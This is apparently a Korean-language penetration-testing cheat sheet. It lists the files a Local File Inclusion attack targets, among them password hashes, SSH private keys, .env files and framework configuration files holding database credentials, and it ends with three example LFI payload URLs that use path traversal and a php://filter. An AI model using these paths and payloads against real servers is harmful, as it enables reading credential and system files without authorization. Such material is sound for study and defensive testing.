## 🎐LFI(Local File Inclusion) 노출 파일의 확장자 종류 

일반적으로 노출되는 **애플리케이션 설정**, **소스 코드**, **자격 증명 정보** 등이 포함되는 파일들과, 특정 웹 프레임워크/엔진에서 자주 볼 수 있는 파일들의 **카테고리별 표**

---

### ✅ **1. 공통적으로 위험한 파일들 (운영체제/애플리케이션 무관)**

| 파일 경로                                       | 설명                                                         |
| ------------------------------------------- | ---------------------------------------------------------- |
| `/etc/passwd`                               | Linux 시스템 사용자 계정 정보 (해시된 비밀번호는 `/etc/shadow`)              |
| `/etc/shadow`                               | Linux 시스템의 비밀번호 해시 (권한 필요)                                 |
| `/proc/self/environ`                        | 웹서버의 환경변수 확인 가능 (`HTTP_COOKIE`, `PATH`, `USER`, `PWD`, 등)  |
| `.htaccess`                                 | Apache 설정 파일 (디렉터리 접근 제어 등 포함)                             |
| `.htpasswd`                                 | Apache 인증 정보 (암호화된 사용자 비밀번호)                               |
| `.bash_history`                             | 쉘 히스토리 (관리자 명령어 노출 가능)                                     |
| `.ssh/id_rsa`                               | 개인 SSH 키 (서버 접근 가능성)                                       |
| `.env`                                      | 환경 변수 파일 (Laravel, Node.js 등에서 자주 사용, DB/PW/API Key 포함 가능) |
| `.DS_Store`                                 | macOS 디렉터리 구조 노출 가능                                        |
| `.git/config`                               | Git 저장소 정보 (리모트 URL 포함)                                    |
| `.git/HEAD`, `.git/index`, `.git/logs/HEAD` | Git 브랜치 정보 및 커밋 히스토리                                       |
| `.svn/entries`, `.svn/wc.db`                | SVN 저장소 정보                                                 |
| `composer.json`, `composer.lock`            | PHP Composer 의존성 정보 (라이브러리 확인 가능)                          |
| `package.json`, `package-lock.json`         | Node.js 패키지 의존성 정보                                         |
| `config.php`, `wp-config.php`               | PHP 앱의 설정파일 (DB 접속 정보 등 포함 가능)                             |
| `web.xml`                                   | Java Web App 설정 파일 (Servlet 경로 등 포함)                       |
| `application.yml`, `application.properties` | Spring Boot 설정 파일 (DB, Port, 보안 정보 포함 가능)                  |

---

### ✅ **2. 프레임워크/엔진 별 LFI 대상 파일 예시**

#### 📘 PHP 기반

| 엔진/프레임워크    | 파일 경로 / 이름                        | 설명                       |
| ----------- | --------------------------------- | ------------------------ |
| Laravel     | `.env`                            | 환경 변수 (DB, API Key 등 포함) |
| Laravel     | `storage/logs/laravel.log`        | 에러 로그 (내부 경로, 에러 정보 포함)  |
| CodeIgniter | `application/config/config.php`   | 앱 설정 파일                  |
| CodeIgniter | `application/config/database.php` | DB 접속 정보 포함              |
| WordPress   | `wp-config.php`                   | DB 접속 정보, 인증 키 포함        |
| Magento     | `app/etc/env.php`                 | DB 및 암호화 키 포함            |

#### 📗 Java 기반

| 엔진/프레임워크    | 파일 경로 / 이름               | 설명                    |
| ----------- | ------------------------ | --------------------- |
| Tomcat      | `WEB-INF/web.xml`        | 서블릿 설정, 필터 설정 등 포함    |
| Spring Boot | `application.properties` | DB 정보 등 설정 포함         |
| Spring Boot | `application.yml`        | YML 형식 설정 파일 (계층형 구조) |

#### 📕 Node.js 기반

| 엔진/프레임워크              | 파일 경로 / 이름     | 설명                          |
| --------------------- | -------------- | --------------------------- |
| Express.js, Next.js 등 | `.env`         | 환경 변수                       |
| -                     | `config.js`    | 설정 정보 (직접 작성 시 자격 정보 포함 가능) |
| -                     | `package.json` | 의존성 정보, 스크립트 포함             |

#### 📙 Python 기반

| 엔진/프레임워크 | 파일 경로 / 이름          | 설명                      |
| -------- | ------------------- | ----------------------- |
| Django   | `settings.py`       | SECRET\_KEY, DB 정보 등 포함 |
| Flask    | `.env`, `config.py` | 환경 변수, 설정 포함            |

---

### ✅ **3. 기타 유용한 LFI 경로들**

| 경로                            | 설명              |
| ----------------------------- | --------------- |
| `/proc/version`               | 커널 버전 및 시스템 정보  |
| `/proc/cmdline`               | 부팅 시 커널에 전달된 인자 |
| `/var/log/apache2/access.log` | 웹 서버 접근 로그      |
| `/var/log/apache2/error.log`  | 웹 서버 에러 로그      |
| `/var/log/nginx/access.log`   | nginx 접근 로그     |
| `/var/log/nginx/error.log`    | nginx 에러 로그     |
| `/root/.bash_history`         | 루트 사용자의 명령어 기록  |

---

### 🔐 **LFI 활용 예시 (PHP 기반)**

```
http://example.com/index.php?page=../../../../etc/passwd
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
http://example.com/index.php?page=/proc/self/environ
```
